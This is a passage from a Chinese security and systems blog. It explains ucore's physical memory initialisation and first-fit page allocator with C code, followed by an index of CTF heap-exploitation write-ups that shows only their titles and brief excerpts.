<h2 id="0x02&#x521D;&#x59CB;&#x5316;&#x7269;&#x7406;&#x5185;&#x5B58;&#x7BA1;&#x7406;&#xFF08;pmm-c-page-init&#xFF09;"><a href="#0x02&#x521D;&#x59CB;&#x5316;&#x7269;&#x7406;&#x5185;&#x5B58;&#x7BA1;&#x7406;&#xFF08;pmm-c-page-init&#xFF09;" class="headerlink" title="0x02&#x521D;&#x59CB;&#x5316;&#x7269;&#x7406;&#x5185;&#x5B58;&#x7BA1;&#x7406;&#xFF08;pmm.c:page_init&#xFF09;"></a>0x02&#x521D;&#x59CB;&#x5316;&#x7269;&#x7406;&#x5185;&#x5B58;&#x7BA1;&#x7406;&#xFF08;pmm.c:page_init&#xFF09;</h2><p>&#x4ECE;&#x7269;&#x7406;&#x5185;&#x5B58;&#x83B7;&#x53D6;&#x7A7A;&#x95F2;&#x5185;&#x5B58;&#x5E03;&#x5C40;<code>struct e820map *memmap = (struct e820map *)(0x8000 + KERNBASE);</code> &#x901A;&#x8FC7;&#x7269;&#x7406;&#x5E03;&#x5C40;&#x83B7;&#x5F97;&#x6700;&#x5927;&#x7684;&#x7269;&#x7406;&#x5730;&#x5740;&#x7A7A;&#x95F4;&#xFF0C;&#x4F46;&#x662F;&#x6700;&#x5927;&#x4E0D;&#x5927;&#x4E8E;0x38000000&#xFF0C;&#x4ECE;&#x800C;&#x8BA1;&#x7B97;&#x5F97;&#x5230;&#x9700;&#x8981;&#x591A;&#x5C11;&#x7269;&#x7406;&#x9875;&#x53BB;&#x7BA1;&#x7406;&#x7269;&#x7406;&#x5185;&#x5B58;</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">        <span class="keyword">if</span> (maxpa &lt; end &amp;&amp; begin &lt; KMEMSIZE) {</span><br><span class="line">            maxpa = end;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"><span class="keyword">if</span> (maxpa &gt; KMEMSIZE) {<span class="comment">//#define KMEMSIZE            0x38000000   </span></span><br><span class="line">    maxpa = KMEMSIZE;</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
<p>&#x56E0;&#x4E3A;&#x52A0;&#x8F7D;ucore&#x7684;&#x7ED3;&#x675F;&#x5730;&#x5740;&#xFF08;&#x7528;end&#x5168;&#x5C40;&#x6307;&#x9488;&#x53D8;&#x91CF;&#x8BB0;&#x5F55;&#xFF09;&#x4EE5;&#x4E0A;&#x7684;&#x9AD8;&#x5730;&#x5740;&#x7A7A;&#x95F4;&#x6CA1;&#x6709;&#x88AB;&#x4F7F;&#x7528;&#xFF0C;&#x6240;&#x4EE5;&#x8BBE;&#x4E3A;&#x7BA1;&#x7406;&#x7269;&#x7406;&#x5185;&#x5B58;&#x7684;&#x7ED3;&#x6784;&#x4F53;Page&#x7684;&#x5185;&#x5B58;&#x7A7A;&#x95F4;&#x8D77;&#x59CB;&#x5730;&#x5740;&#x4E3A; <code>pages = (struct Page *)ROUNDUP((void *)end, PGSIZE);</code></p>
<p>&#x4E3A;&#x4E86;&#x7B80;&#x5316;&#x8D77;&#x89C1;&#xFF0C;&#x5DF2;&#x4F7F;&#x7528;&#x7269;&#x7406;&#x7A7A;&#x95F4;&#x8BBE;&#x4E3A;0~pages&#xFF0C;&#x7A7A;&#x95F2;&#x7269;&#x7406;&#x7A7A;&#x95F4;&#x8BBE;&#x4E3A;pages~0x38000000&#x3002;</p>
<p>&#x7ED3;&#x5C3E;&#x8C03;&#x7528;init_memmap&#x51FD;&#x6570;&#x521D;&#x59CB;&#x5316;&#x7A7A;&#x95F2;&#x7269;&#x7406;&#x5730;&#x5740;&#x7A7A;&#x95F4;&#x3002;&#x6BCF;&#x4E00;&#x9875;&#x7269;&#x7406;&#x5E27;&#x90FD;&#x5BF9;&#x5E94;&#x4E00;&#x4E2A;Page&#x7ED3;&#x6784;&#x4F53;</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Page</span> {</span></span><br><span class="line">    <span class="keyword">int</span> ref;                        <span class="comment">// page frame&apos;s reference counter to page table</span></span><br><span class="line">    <span class="keyword">uint32_t</span> flags;                 <span class="comment">// array of flags that describe the status of the page frame</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> property;          <span class="comment">// the num of free block, used in first fit pm manager</span></span><br><span class="line">    <span class="keyword">list_entry_t</span> page_link;         <span class="comment">// free list link</span></span><br><span class="line">};</span><br></pre></td></tr></table></figure>
<p>&#x63A5;&#x7740;&#x5BF9;&#x6240;&#x6709;&#x7269;&#x7406;&#x9875;&#x8FDB;&#x884C;&#x5360;&#x7528;&#x6807;&#x8BB0;</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; npage; i ++) {</span><br><span class="line">    SetPageReserved(pages + i);</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
<h2 id="0x03-&#x521D;&#x59CB;&#x5316;&#x7A7A;&#x95F2;&#x7269;&#x7406;&#x5185;&#x5B58;&#xFF08;default-pmm-c-default-init-memmap&#xFF09;"><a href="#0x03-&#x521D;&#x59CB;&#x5316;&#x7A7A;&#x95F2;&#x7269;&#x7406;&#x5185;&#x5B58;&#xFF08;default-pmm-c-default-init-memmap&#xFF09;" class="headerlink" title="0x03 &#x521D;&#x59CB;&#x5316;&#x7A7A;&#x95F2;&#x7269;&#x7406;&#x5185;&#x5B58;&#xFF08;default_pmm.c:default_init_memmap&#xFF09;"></a>0x03 &#x521D;&#x59CB;&#x5316;&#x7A7A;&#x95F2;&#x7269;&#x7406;&#x5185;&#x5B58;&#xFF08;default_pmm.c:default_init_memmap&#xFF09;</h2><p>&#x6E05;&#x9664;&#x6807;&#x5FD7;&#x7A7A;&#x95F2;&#x7269;&#x7406;&#x5185;&#x5B58;&#x7684;&#x7ED3;&#x6784;&#x4F53;Page&#x7684;&#x6807;&#x5FD7;&#x4F4D;&#xFF0C;&#x8868;&#x793A;pages~KMEMSIZE&#x4E3A;&#x7A7A;&#x95F2;&#x5185;&#x5B58;&#xFF0C;</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (; p != base + n; p ++) {</span><br><span class="line">    assert(PageReserved(p));</span><br><span class="line">    p-&gt;flags = p-&gt;property = <span class="number">0</span>;</span><br><span class="line">    set_page_ref(p, <span class="number">0</span>);</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
<p>&#x8BBE;&#x7F6E;&#x7BA1;&#x7406;&#x8FDE;&#x7EED;&#x5185;&#x5B58;&#x7A7A;&#x95F2;&#x5757;&#x7684;&#x7ED3;&#x6784;&#x4F53;</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> {</span></span><br><span class="line">    <span class="keyword">list_entry_t</span> free_list;         <span class="comment">// the list header</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> nr_free;           <span class="comment">// # of free pages in this free list</span></span><br><span class="line">} <span class="keyword">free_area_t</span>;</span><br></pre></td></tr></table></figure>
<p>TIPS&#xFF1A;pages~0x38000000&#x7684;&#x6BCF;&#x4E00;&#x4E2A;&#x7269;&#x7406;&#x9875;&#x90FD;&#x5BF9;&#x5E94;&#x4E00;&#x4E2A;Page&#x7ED3;&#x6784;&#x4F53;&#xFF0C;ucore&#x901A;&#x8FC7;Page&#x7ED3;&#x6784;&#x4F53;&#x53BB;&#x7BA1;&#x7406;&#x7269;&#x7406;&#x5185;&#x5B58;&#xFF0C;free_area_t&#x7ED3;&#x6784;&#x4F53;&#x8BB0;&#x5F55;&#x7A7A;&#x95F2;&#x7684;&#x8FDE;&#x7EED;&#x7269;&#x7406;&#x5185;&#x5B58;&#x5757;&#x3002;</p>
<h2 id="0x04-first-fit&#x8FDE;&#x7EED;&#x7269;&#x7406;&#x5185;&#x5B58;&#x5206;&#x914D;&#x7B97;&#x6CD5;&#xFF08;&#x5B9E;&#x9A8C;&#xFF09;"><a href="#0x04-first-fit&#x8FDE;&#x7EED;&#x7269;&#x7406;&#x5185;&#x5B58;&#x5206;&#x914D;&#x7B97;&#x6CD5;&#xFF08;&#x5B9E;&#x9A8C;&#xFF09;" class="headerlink" title="0x04 first-fit&#x8FDE;&#x7EED;&#x7269;&#x7406;&#x5185;&#x5B58;&#x5206;&#x914D;&#x7B97;&#x6CD5;&#xFF08;&#x5B9E;&#x9A8C;&#xFF09;"></a>0x04 first-fit&#x8FDE;&#x7EED;&#x7269;&#x7406;&#x5185;&#x5B58;&#x5206;&#x914D;&#x7B97;&#x6CD5;&#xFF08;&#x5B9E;&#x9A8C;&#xFF09;</h2><h3 id="&#x601D;&#x8DEF;"><a href="#&#x601D;&#x8DEF;" class="headerlink" title="&#x601D;&#x8DEF;"></a>&#x601D;&#x8DEF;</h3><p>first-fit&#x7B97;&#x6CD5;&#x7684;&#x601D;&#x8DEF;&#x5C31;&#x662F;&#x6309;&#x5E8F;&#x904D;&#x5386;&#xFF0C;&#x5F53;&#x5927;&#x5C0F;&#x6EE1;&#x8DB3;&#x5373;&#x5206;&#x914D;&#xFF0C;&#x5177;&#x4F53;&#x6765;&#x8BF4;&#xFF1A;&#x5F53;&#x7533;&#x8BF7;&#x5185;&#x5B58;&#x65F6;first-fit&#x7684;&#x601D;&#x8DEF;&#x662F;&#x4ECE;&#x7A7A;&#x95F2;&#x94FE;&#x8868;&#x7684;&#x8868;&#x5934;&#x5F00;&#x59CB;&#x5BFB;&#x627E;&#x5730;&#x5740;&#x6700;&#x5C0F;&#x7684;&#x7269;&#x7406;&#x9875;&#xFF0C;&#x901A;&#x8FC7;nr_free-&gt;next&#x6216;&#x8005;&#x901A;&#x8FC7;&#x5B9A;&#x4E49;&#x597D;&#x7684;&#x51FD;&#x6570;list_next&#x53BB;&#x5BFB;&#x627E;&#xFF0C;&#x627E;&#x5230;&#x7A7A;&#x95F2;&#x7269;&#x7406;&#x9875;&#x540E;&#xFF0C;&#x9700;&#x8981;&#x5224;&#x65AD;&#x5927;&#x5C0F;&#x662F;&#x4E0D;&#x662F;&#x6EE1;&#x8DB3;&#xFF0C;&#x8FD9;&#x4E3B;&#x8981;&#x901A;&#x8FC7;Page&#x7ED3;&#x6784;&#x4F53;&#x7684;property&#x6210;&#x5458;&#x5224;&#x65AD;&#xFF0C;&#x6240;&#x4EE5;&#x9700;&#x8981;&#x901A;&#x8FC7;le2page&#x5B8F;&#xFF0C;&#x901A;&#x8FC7;&#x94FE;&#x8868;&#x5143;&#x7D20;&#x6307;&#x9488;nr_free&#x8BA1;&#x7B97;&#x51FA;&#x76F8;&#x5E94;&#x7684;Page&#x6307;&#x9488;p&#xFF0C;&#x5F53;property&gt;=n&#x65F6;&#xFF0C;&#x5927;&#x5C0F;&#x6EE1;&#x8DB3;&#xFF0C;&#x5373;&#x5206;&#x914D;&#x51FA;&#x53BB;&#x3002;</p>
<h3 id="&#x5B9E;&#x73B0;"><a href="#&#x5B9E;&#x73B0;" class="headerlink" title="&#x5B9E;&#x73B0;"></a>&#x5B9E;&#x73B0;</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">Page</span> *</span></span><br><span class="line"><span class="class"><span class="title">default_alloc_pages</span>(<span class="title">size_t</span> <span class="title">n</span>) {</span></span><br><span class="line">    assert(n &gt; <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (n &gt; nr_free) {</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Page</span> *<span class="title">page</span> = <span class="title">NULL</span>;</span></span><br><span class="line">    <span class="keyword">list_entry_t</span> *le = &amp;free_list;</span><br><span class="line">    <span class="comment">// <span class="doctag">TODO:</span> optimize (next-fit)</span></span><br><span class="line">    <span class="keyword">while</span> ((le = list_next(le)) != &amp;free_list) {</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">Page</span> *<span class="title">p</span> = <span class="title">le2page</span>(<span class="title">le</span>, <span class="title">page_link</span>);</span></span><br><span class="line">        <span class="keyword">if</span> (p-&gt;property &gt;= n) {</span><br><span class="line">            page = p;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">if</span> (page != <span class="literal">NULL</span>) {</span><br><span class="line">        <span class="keyword">if</span> (page-&gt;property &gt; n) {</span><br><span class="line">            <span class="class"><span class="keyword">struct</span> <span class="title">Page</span> *<span class="title">p</span> = <span class="title">page</span> + <span class="title">n</span>;</span></span><br><span class="line">            p-&gt;property = page-&gt;property - n;</span><br><span class="line">            SetPageProperty(p);</span><br><span class="line">            list_add_after(&amp;(page-&gt;page_link), &amp;(p-&gt;page_link));</span><br><span class="line">        }</span><br><span class="line">        list_del(&amp;(page-&gt;page_link));</span><br><span class="line">        nr_free -= n;</span><br><span class="line">        ClearPageProperty(page);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> page;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">default_free_pages(struct Page *base, <span class="keyword">size_t</span> n) {</span><br><span class="line">    assert(n &gt; <span class="number">0</span>);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Page</span> *<span class="title">p</span> = <span class="title">base</span>;</span></span><br><span class="line">    <span class="keyword">for</span> (; p != base + n; p ++) {</span><br><span class="line">        assert(!PageReserved(p) &amp;&amp; !PageProperty(p));</span><br><span class="line">        p-&gt;flags = <span class="number">0</span>;</span><br><span class="line">        set_page_ref(p, <span class="number">0</span>);</span><br><span class="line">    }</span><br><span class="line">    base-&gt;property = n;</span><br><span class="line">    SetPageProperty(base);</span><br><span class="line">    <span class="keyword">list_entry_t</span> *le = list_next(&amp;free_list);</span><br><span class="line">    <span class="keyword">while</span> (le != &amp;free_list) {</span><br><span class="line">        p = le2page(le, page_link);</span><br><span class="line">        le = list_next(le);</span><br><span class="line">        <span class="comment">// <span class="doctag">TODO:</span> optimize</span></span><br><span class="line">        <span class="keyword">if</span> (base + base-&gt;property == p) {</span><br><span class="line">            base-&gt;property += p-&gt;property;</span><br><span class="line">            ClearPageProperty(p);</span><br><span class="line">            list_del(&amp;(p-&gt;page_link));</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (p + p-&gt;property == base) {</span><br><span class="line">            p-&gt;property += base-&gt;property;</span><br><span class="line">            ClearPageProperty(base);</span><br><span class="line">            base = p;</span><br><span class="line">            list_del(&amp;(p-&gt;page_link));</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    nr_free += n;</span><br><span class="line">    le = list_next(&amp;free_list);</span><br><span class="line">    <span class="keyword">while</span> (le != &amp;free_list) {</span><br><span class="line">        p = le2page(le, page_link);</span><br><span class="line">        <span class="keyword">if</span> (base + base-&gt;property &lt;= p) {</span><br><span class="line">            assert(base + base-&gt;property != p);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        }</span><br><span class="line">        le = list_next(le);</span><br><span class="line">    }</span><br><span class="line">    list_add_before(le, &amp;(base-&gt;page_link));</span><br><span class="line">}</span><br></pre></td></tr></table></figure>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/09/22/seccomp沙箱机制 & 2019ByteCTF VIP/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Po1lux">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/IMG.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Po1lux's Diary">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/09/22/seccomp沙箱机制 & 2019ByteCTF VIP/" itemprop="url">seccomp沙箱机制 & 2019ByteCTF VIP</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-09-22T21:54:01+08:00">
                2019-09-22
              </time>
            

            

            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/heap/" itemprop="url" rel="index">
                    <span itemprop="name">heap</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
              <span class="post-comments-count">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-comment-o"></i>
                </span>
                <a href="/2019/09/22/seccomp沙箱机制 & 2019ByteCTF VIP/#comments" itemprop="discussionUrl">
                  <span class="post-comments-count valine-comment-count" data-xid="/2019/09/22/seccomp沙箱机制 & 2019ByteCTF VIP/" itemprop="commentCount"></span>
                </a>
              </span>
            
          

          
          
             <span id="/2019/09/22/seccomp沙箱机制 & 2019ByteCTF VIP/" class="leancloud_visitors" data-flag-title="seccomp沙箱机制 & 2019ByteCTF VIP">
               <span class="post-meta-divider">|</span>
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               
                 <span class="post-meta-item-text">阅读次数&#58;</span>
               
                 <span class="leancloud-visitors-count"></span>
             </span>
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          seccomp沙箱机制
          <!--noindex-->
          <div class="post-button text-center">
            <a class="btn" href="/2019/09/22/seccomp沙箱机制 & 2019ByteCTF VIP/">
              阅读全文 &raquo;
            </a>
          </div>
          <!--/noindex-->
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/06/25/2019-SCTF-easy-heap-fastbin-attack/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Po1lux">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/IMG.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Po1lux's Diary">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/06/25/2019-SCTF-easy-heap-fastbin-attack/" itemprop="url">2019-SCTF-easy_heap[fastbin attack]</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-06-25T21:54:01+08:00">
                2019-06-25
              </time>
            

            

            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/heap/" itemprop="url" rel="index">
                    <span itemprop="name">heap</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
              <span class="post-comments-count">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-comment-o"></i>
                </span>
                <a href="/2019/06/25/2019-SCTF-easy-heap-fastbin-attack/#comments" itemprop="discussionUrl">
                  <span class="post-comments-count valine-comment-count" data-xid="/2019/06/25/2019-SCTF-easy-heap-fastbin-attack/" itemprop="commentCount"></span>
                </a>
              </span>
            
          

          
          
             <span id="/2019/06/25/2019-SCTF-easy-heap-fastbin-attack/" class="leancloud_visitors" data-flag-title="2019-SCTF-easy_heap[fastbin attack]">
               <span class="post-meta-divider">|</span>
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               
                 <span class="post-meta-item-text">阅读次数&#58;</span>
               
                 <span class="leancloud-visitors-count"></span>
             </span>
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          比较经典的fastbin attack
          <!--noindex-->
          <div class="post-button text-center">
            <a class="btn" href="/2019/06/25/2019-SCTF-easy-heap-fastbin-attack/">
              阅读全文 &raquo;
            </a>
          </div>
          <!--/noindex-->
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/06/25/2019-SCTF-one_heap/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Po1lux">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/IMG.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Po1lux's Diary">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/06/25/2019-SCTF-one_heap/" itemprop="url">2019-SCTF-one_heap[tcache的counts中存在的数据类型判断漏洞]</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-06-25T16:35:18+08:00">
                2019-06-25
              </time>
            

            

            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/heap/" itemprop="url" rel="index">
                    <span itemprop="name">heap</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
              <span class="post-comments-count">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-comment-o"></i>
                </span>
                <a href="/2019/06/25/2019-SCTF-one_heap/#comments" itemprop="discussionUrl">
                  <span class="post-comments-count valine-comment-count" data-xid="/2019/06/25/2019-SCTF-one_heap/" itemprop="commentCount"></span>
                </a>
              </span>
            
          

          
          
             <span id="/2019/06/25/2019-SCTF-one_heap/" class="leancloud_visitors" data-flag-title="2019-SCTF-one_heap[tcache的counts中存在的数据类型判断漏洞]">
               <span class="post-meta-divider">|</span>
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               
                 <span class="post-meta-item-text">阅读次数&#58;</span>
               
                 <span class="leancloud-visitors-count"></span>
             </span>
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          tcache的counts中存在的数据类型判断漏洞
          <!--noindex-->
          <div class="post-button text-center">
            <a class="btn" href="/2019/06/25/2019-SCTF-one_heap/">
              阅读全文 &raquo;
            </a>
          </div>
          <!--/noindex-->
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/06/10/2019-TCTF-final-babyheap2-29/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Po1lux">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/IMG.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Po1lux's Diary">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/06/10/2019-TCTF-final-babyheap2-29/" itemprop="url">2019-TCTF(final)-babyheap2.29</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-06-10T12:54:46+08:00">
                2019-06-10
              </time>
            

            

            
          </span>

          

          
            
              <span class="post-comments-count">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-comment-o"></i>
                </span>
                <a href="/2019/06/10/2019-TCTF-final-babyheap2-29/#comments" itemprop="discussionUrl">
                  <span class="post-comments-count valine-comment-count" data-xid="/2019/06/10/2019-TCTF-final-babyheap2-29/" itemprop="commentCount"></span>
                </a>
              </span>
            
          

          
          
             <span id="/2019/06/10/2019-TCTF-final-babyheap2-29/" class="leancloud_visitors" data-flag-title="2019-TCTF(final)-babyheap2.29">
               <span class="post-meta-divider">|</span>
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               
                 <span class="post-meta-item-text">阅读次数&#58;</span>
               
                 <span class="leancloud-visitors-count"></span>
             </span>
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="0x00-&#x7A0B;&#x5E8F;&#x5206;&#x6790;"><a href="#0x00-&#x7A0B;&#x5E8F;&#x5206;&#x6790;" class="headerlink" title="0x00 &#x7A0B;&#x5E8F;&#x5206;&#x6790;"></a>0x00 &#x7A0B;&#x5E8F;&#x5206;&#x6790;</h2><p>&#x7A0B;&#x5E8F;&#x7ED9;&#x4E86;libc&#xFF0C;&#x7248;&#x672C;&#x662F;&#x6700;&#x65B0;&#x7248;&#x7684;2.29&#xFF0C;&#x5728;&#x539F;&#x6709;&#x7684;&#x5806;&#x5229;&#x7528;&#x65B9;&#x5F0F;&#x52A0;&#x4E86;&#x5F88;&#x591A;&#x9650;&#x5236;&#xFF0C;&#x6BD4;&#x5982;&#x5806;&#x91CD;&#x53E0;&#xFF0C;tcache&#x7684;&#x5F31;&#x68C0;&#x6D4B;</p>
<p>&#x5148;&#x770B;&#x4E0B;&#x7A0B;&#x5E8F;&#x5F00;&#x542F;&#x7684;&#x4FDD;&#x62A4;&#xFF1A;</p>
